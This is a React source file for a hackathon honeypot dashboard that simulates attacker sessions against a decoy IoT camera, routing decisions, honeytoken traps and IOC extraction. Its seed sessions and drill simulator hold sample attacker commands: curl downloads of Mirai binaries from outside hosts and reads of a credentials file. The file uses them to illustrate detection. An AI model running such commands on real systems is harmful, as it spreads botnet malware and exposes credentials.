import React, { useState } from 'react'
import './decoy.css'

// Shared schema interface matching schema.py
export interface DecoySessionEvent {
  session_id: string
  source_ip: string
  service: string
  failed_logins: number
  commands: string[]
  honeytoken_hit: boolean
  malware_hash?: string | null
  c2_address?: string | null
}

export interface RouteDecision {
  source_ip: string
  destination: string
  score: number
  reason: string
}

// Default seed sessions demonstrating Stage 2 state
const INITIAL_SESSIONS: DecoySessionEvent[] = [
  {
    session_id: 'sess-alpha-71',
    source_ip: '194.26.29.112',
    service: 'ssh',
    failed_logins: 3,
    commands: [
      'uname -a',
      'ls /etc/camera',
      'curl http://185.220.101.5:8080/mirai.arm7 -o /tmp/bot',
      'cat /etc/camera/credentials.conf',
    ],
    honeytoken_hit: true,
    malware_hash: 'd41d8cd98f00b204e9800998ecf8427e',
    c2_address: 'http://185.220.101.5:8080/mirai.arm7',
  },
  {
    session_id: 'sess-beta-19',
    source_ip: '203.0.113.88',
    service: 'web',
    failed_logins: 2,
    commands: ['GET /api/decoy/web/login', 'POST /api/decoy/web/login (admin/admin)'],
    honeytoken_hit: false,
    malware_hash: null,
    c2_address: null,
  },
  {
    session_id: 'sess-gamma-42',
    source_ip: '45.154.255.90',
    service: 'ssh',
    failed_logins: 1,
    commands: ['pwd', 'whoami', 'cat /proc/version'],
    honeytoken_hit: false,
    malware_hash: null,
    c2_address: null,
  },
]

const INITIAL_ROUTES: RouteDecision[] = [
  {
    source_ip: '127.0.0.1',
    destination: 'real',
    score: 0.0,
    reason: 'Trusted source IP in gateway allowlist',
  },
  {
    source_ip: '198.51.100.20',
    destination: 'rate_limit',
    score: 30.0,
    reason: 'Fail-safe rate limit applied: Multi-service probe (web, ssh)',
  },
  {
    source_ip: '194.26.29.112',
    destination: 'decoy',
    score: 65.0,
    reason: 'Hostile threshold crossed: IoT default credential attempted (root:123456)',
  },
  {
    source_ip: '203.0.113.88',
    destination: 'decoy',
    score: 65.0,
    reason: 'Hostile threshold crossed: IoT default credential attempted (admin:admin)',
  },
]

export const DecoyPage: React.FC = () => {
  const [sessions, setSessions] = useState<DecoySessionEvent[]>(INITIAL_SESSIONS)
  const [routes, setRoutes] = useState<RouteDecision[]>(INITIAL_ROUTES)
  const [selectedSessionId, setSelectedSessionId] = useState<string>(INITIAL_SESSIONS[0].session_id)
  const [activeTab, setActiveTab] = useState<'sessions' | 'routes'>('sessions')
  const [customCmd, setCustomCmd] = useState<string>('')

  const selectedSession = sessions.find((s) => s.session_id === selectedSessionId) || sessions[0]

  // Count aggregates
  const totalHoneytokenHits = sessions.filter((s) => s.honeytoken_hit).length
  const totalIOCs = sessions.filter((s) => s.malware_hash || s.c2_address).length
  const decoyRouteCount = routes.filter((r) => r.destination === 'decoy').length
  const rateLimitCount = routes.filter((r) => r.destination === 'rate_limit').length
  const realCount = routes.filter((r) => r.destination === 'real').length

  // Interactive Drill Simulation Handlers
  const handleSimulateBenign = () => {
    const ip = '127.0.0.1'
    const newRoute: RouteDecision = {
      source_ip: ip,
      destination: 'real',
      score: 0.0,
      reason: 'Trusted operator IP from local subnet',
    }
    setRoutes((prev) => [newRoute, ...prev.filter((r) => r.source_ip !== ip)])
  }

  const handleSimulateRecon = () => {
    const ip = `198.51.100.${Math.floor(Math.random() * 80 + 10)}`
    const newRoute: RouteDecision = {
      source_ip: ip,
      destination: 'rate_limit',
      score: 35.0,
      reason: 'Fail-safe rate limit: Rapid port scan detected (web + rtsp probe)',
    }
    setRoutes((prev) => [newRoute, ...prev])
  }

  const handleSimulateAttack = () => {
    const sid = `sess-mirai-${Math.floor(Math.random() * 900 + 100)}`
    const ip = `185.220.101.${Math.floor(Math.random() * 200 + 10)}`

    const newRoute: RouteDecision = {
      source_ip: ip,
      destination: 'decoy',
      score: 75.0,
      reason: 'Hostile credential brute force (admin:admin) -> routed to Phantom Twin',
    }
    setRoutes((prev) => [newRoute, ...prev])

    const newSession: DecoySessionEvent = {
      session_id: sid,
      source_ip: ip,
      service: 'ssh',
      failed_logins: 2,
      commands: [
        'whoami',
        'curl http://c2.botnet-mesh.su:8080/mirai.arm -o /tmp/loader',
        'cat /etc/camera/credentials.conf',
      ],
      honeytoken_hit: true,
      malware_hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      c2_address: 'http://c2.botnet-mesh.su:8080/mirai.arm',
    }
    setSessions((prev) => [newSession, ...prev])
    setSelectedSessionId(sid)
  }

  const handleRunCommand = (e: React.FormEvent) => {
    e.preventDefault()
    if (!customCmd.trim() || !selectedSession) return

    const trimmed = customCmd.trim()
    const isHoneytoken =
      trimmed.includes('credentials.conf') ||
      trimmed.includes('vault_token.key') ||
      trimmed.includes('firmware_pass.enc')

    // Basic IOC check
    let extractedHash: string | null = null
    let extractedC2: string | null = null
    if (trimmed.includes('http://') || trimmed.includes('https://')) {
      const match = trimmed.match(/(https?:\/\/[^\s]+)/)
      if (match) extractedC2 = match[1]
    }
    if (trimmed.match(/\b[a-f0-9]{32,64}\b/i)) {
      const match = trimmed.match(/\b[a-f0-9]{32,64}\b/i)
      if (match) extractedHash = match[0]
    }

    const updatedSession: DecoySessionEvent = {
      ...selectedSession,
      commands: [...selectedSession.commands, trimmed],
      honeytoken_hit: selectedSession.honeytoken_hit || isHoneytoken,
      malware_hash: extractedHash || selectedSession.malware_hash,
      c2_address: extractedC2 || selectedSession.c2_address,
    }

    setSessions((prev) => prev.map((s) => (s.session_id === selectedSession.session_id ? updatedSession : s)))
    setCustomCmd('')
  }

  return (
    <div className="page-container" id="page-decoy">
      {/* Page Header */}
      <div className="page-header">
        <div className="badge owner-badge">Owner: Member B — Stage 2 (Phantom Twin & Gateway)</div>
        <h1 id="heading-decoy">Decoy Activity & Gateway</h1>
        <p className="page-desc">
          Intelligent perimeter routing, in-memory IoT honeypot sandbox, honeytoken bait traps, and automated
          IOC extraction feeding Stage 3 clustering.
        </p>
      </div>

      {/* Honeytoken Threat Alert Banner */}
      {totalHoneytokenHits > 0 && (
        <div className="honeytoken-banner">
          <div className="banner-left">
            <div className="banner-icon">⚠️</div>
            <div>
              <div className="banner-title">Honeytoken Trap Tripped (Maximum Confidence Hostility)</div>
              <div className="banner-desc">
                Attacker accessed bait file inside the virtual camera filesystem. Reverse-trap Rickroll payload
                engaged within sandbox.
              </div>
            </div>
          </div>
          <span className="badge-pill badge-trap">TRAP ACTIVE ({totalHoneytokenHits})</span>
        </div>
      )}

      {/* Metrics Row */}
      <div className="decoy-grid">
        <div className="stat-card">
          <div className="stat-header">
            <span className="stat-label">Active Decoy Sessions</span>
            <span className="stat-icon" style={{ background: 'rgba(56, 189, 248, 0.15)', color: '#38bdf8' }}>
              📡
            </span>
          </div>
          <div className="stat-val">{sessions.length}</div>
          <div className="stat-sub">
            <span className="status-indicator-dot" style={{ background: '#38bdf8' }}></span>
            <span>Virtual Sandbox ({realCount} safe routed to real)</span>
          </div>
        </div>

        <div className="stat-card">
          <div className="stat-header">
            <span className="stat-label">Trapped Hostiles</span>
            <span className="stat-icon" style={{ background: 'rgba(244, 63, 94, 0.15)', color: '#f43f5e' }}>
              🎯
            </span>
          </div>
          <div className="stat-val">{decoyRouteCount}</div>
          <div className="stat-sub">
            <span className="status-indicator-dot" style={{ background: '#f43f5e' }}></span>
            <span>Sticky decoy routes</span>
          </div>
        </div>

        <div className="stat-card">
          <div className="stat-header">
            <span className="stat-label">Fail-Safe Throttled</span>
            <span className="stat-icon" style={{ background: 'rgba(245, 158, 11, 0.15)', color: '#f59e0b' }}>
              ⏳
            </span>
          </div>
          <div className="stat-val">{rateLimitCount}</div>
          <div className="stat-sub">
            <span className="status-indicator-dot" style={{ background: '#f59e0b' }}></span>
            <span>Rate-limited probes</span>
          </div>
        </div>

        <div className="stat-card">
          <div className="stat-header">
            <span className="stat-label">Extracted IOCs</span>
            <span className="stat-icon" style={{ background: 'rgba(99, 102, 241, 0.15)', color: '#6366f1' }}>
              🔍
            </span>
          </div>
          <div className="stat-val">{totalIOCs}</div>
          <div className="stat-sub">
            <span className="status-indicator-dot" style={{ background: '#6366f1' }}></span>
            <span>Malware Hashes / C2s</span>
          </div>
        </div>
      </div>

      {/* Main Two-Column Work Area */}
      <div className="decoy-sections">
        {/* Left Column: Sessions & Gateway Tables */}
        <div className="panel-card">
          <div className="panel-title-bar">
            <div className="panel-title">
              <span>🛡️</span>
              <span>Perimeter Telemetry</span>
            </div>
            <div style={{ display: 'flex', gap: '0.4rem' }}>
              <button
                className={`btn-sim ${activeTab === 'sessions' ? 'btn-sim-danger' : ''}`}
                style={activeTab === 'sessions' ? { borderColor: '#38bdf8', color: '#38bdf8' } : {}}
                onClick={() => setActiveTab('sessions')}
              >
                Honeypot Sessions ({sessions.length})
              </button>
              <button
                className={`btn-sim ${activeTab === 'routes' ? 'btn-sim-danger' : ''}`}
                style={activeTab === 'routes' ? { borderColor: '#38bdf8', color: '#38bdf8' } : {}}
                onClick={() => setActiveTab('routes')}
              >
                Route Decisions ({routes.length})
              </button>
            </div>
          </div>

          {activeTab === 'sessions' ? (
            <div className="sessions-table-wrapper">
              <table className="decoy-table">
                <thead>
                  <tr>
                    <th>Session ID</th>
                    <th>Source IP</th>
                    <th>Service</th>
                    <th>Logins</th>
                    <th>Honeytoken</th>
                    <th>IOCs</th>
                  </tr>
                </thead>
                <tbody>
                  {sessions.map((sess) => (
                    <tr
                      key={sess.session_id}
                      className={`session-row ${sess.session_id === selectedSession?.session_id ? 'selected' : ''}`}
                      onClick={() => setSelectedSessionId(sess.session_id)}
                    >
                      <td>
                        <code>{sess.session_id}</code>
                      </td>
                      <td>
                        <strong>{sess.source_ip}</strong>
                      </td>
                      <td>
                        <span className="badge-pill" style={{ background: 'rgba(255,255,255,0.06)' }}>
                          {sess.service.toUpperCase()}
                        </span>
                      </td>
                      <td>{sess.failed_logins} fail</td>
                      <td>
                        {sess.honeytoken_hit ? (
                          <span className="badge-pill badge-trap">TRIPPED</span>
                        ) : (
                          <span style={{ color: 'var(--text-muted)' }}>Armed</span>
                        )}
                      </td>
                      <td>
                        {sess.malware_hash || sess.c2_address ? (
                          <span className="ioc-tag">
                            {sess.malware_hash ? sess.malware_hash.slice(0, 8) + '...' : sess.c2_address}
                          </span>
                        ) : (
                          <span style={{ color: 'var(--text-muted)' }}>—</span>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : (
            <div className="sessions-table-wrapper">
              <table className="decoy-table">
                <thead>
                  <tr>
                    <th>Source IP</th>
                    <th>Decision</th>
                    <th>Risk Score</th>
                    <th>Reason</th>
                  </tr>
                </thead>
                <tbody>
                  {routes.map((rt, idx) => (
                    <tr key={idx}>
                      <td>
                        <strong>{rt.source_ip}</strong>
                      </td>
                      <td>
                        {rt.destination === 'decoy' && <span className="badge-pill badge-decoy">DECOY</span>}
                        {rt.destination === 'rate_limit' && (
                          <span className="badge-pill badge-ratelimit">RATE-LIMIT</span>
                        )}
                        {rt.destination === 'real' && <span className="badge-pill badge-real">REAL</span>}
                      </td>
                      <td>
                        <code style={{ color: rt.score >= 60 ? '#fb7185' : rt.score >= 20 ? '#fbbf24' : '#34d399' }}>
                          {rt.score.toFixed(1)}
                        </code>
                      </td>
                      <td style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>{rt.reason}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}

          {/* Drill Simulator Controller */}
          <div className="sim-controls">
            <span style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-muted)', textTransform: 'uppercase' }}>
              Hackathon Drill Simulator (Drill B / Drill C)
            </span>
            <div className="sim-btn-row">
              <button className="btn-sim" onClick={handleSimulateBenign}>
                + Benign Admin (127.0.0.1 → Real)
              </button>
              <button className="btn-sim" onClick={handleSimulateRecon}>
                + Port Scanner (Rate-Limit)
              </button>
              <button className="btn-sim btn-sim-danger" onClick={handleSimulateAttack}>
                ⚡ Mirai Brute-Force + Rickroll Trap
              </button>
            </div>
          </div>
        </div>

        {/* Right Column: Terminal Keystroke Monitor */}
        <div className="panel-card">
          <div className="panel-title-bar">
            <div className="panel-title">
              <span>💻</span>
              <span>Attacker Keystroke Audit</span>
            </div>
            {selectedSession && (
              <span className="badge-pill badge-decoy">
                {selectedSession.session_id} @ {selectedSession.source_ip}
              </span>
            )}
          </div>

          <div className="terminal-window">
            <div className="terminal-header">
              <div className="terminal-dots">
                <div className="dot dot-red"></div>
                <div className="dot dot-yellow"></div>
                <div className="dot dot-green"></div>
              </div>
              <div className="terminal-title">AegisCam Embedded Linux [Phantom Twin]</div>
            </div>

            <div className="terminal-body">
              <div>
                <span className="terminal-prompt">system:</span>
                <span>Session established from {selectedSession?.source_ip} via {selectedSession?.service}</span>
              </div>
              {selectedSession?.failed_logins ? (
                <div style={{ color: '#fbbf24' }}>
                  <span className="terminal-prompt">auth:</span>
                  <span>{selectedSession.failed_logins} failed authentication attempt(s) logged</span>
                </div>
              ) : null}

              {selectedSession?.commands.map((cmd, i) => (
                <div key={i} style={{ marginTop: '0.4rem' }}>
                  <div>
                    <span className="terminal-prompt">root@aegis-cam:~#</span>
                    <span>{cmd}</span>
                  </div>
                  {cmd.includes('credentials.conf') ||
                  cmd.includes('vault_token.key') ||
                  cmd.includes('firmware_pass.enc') ? (
                    <div className="terminal-rickroll">
                      <div>🎵 NEVER GONNA GIVE YOU UP, NEVER GONNA LET YOU DOWN 🎵</div>
                      <div style={{ fontSize: '0.725rem', marginTop: '0.2rem', color: '#fca5a5' }}>
                        [!] HONEYTOKEN ACCESS TRIGGERED — Session isolated in sandbox with Max Hostility.
                      </div>
                    </div>
                  ) : null}
                </div>
              ))}

              {selectedSession?.honeytoken_hit && (
                <div style={{ marginTop: '0.8rem', color: '#f43f5e', fontSize: '0.75rem' }}>
                  [AUDIT] Stage 2 Honeypot alerted Member C intel cluster with high-confidence signature.
                </div>
              )}
            </div>
          </div>

          {/* Direct Shell Injection Form */}
          <form onSubmit={handleRunCommand} style={{ display: 'flex', gap: '0.5rem' }}>
            <input
              type="text"
              placeholder="Inject command (e.g. cat /etc/camera/credentials.conf, ls, whoami)..."
              value={customCmd}
              onChange={(e) => setCustomCmd(e.target.value)}
              style={{
                flex: 1,
                padding: '0.55rem 0.85rem',
                background: 'rgba(13, 18, 29, 0.8)',
                border: '1px solid var(--border-subtle)',
                borderRadius: 'var(--radius-sm)',
                color: '#fff',
                fontFamily: 'var(--font-mono)',
                fontSize: '0.8rem',
              }}
            />
            <button type="submit" className="btn-sim" style={{ borderColor: 'var(--accent-cyan)', color: 'var(--accent-cyan)' }}>
              Send
            </button>
          </form>
        </div>
      </div>
    </div>
  )
}
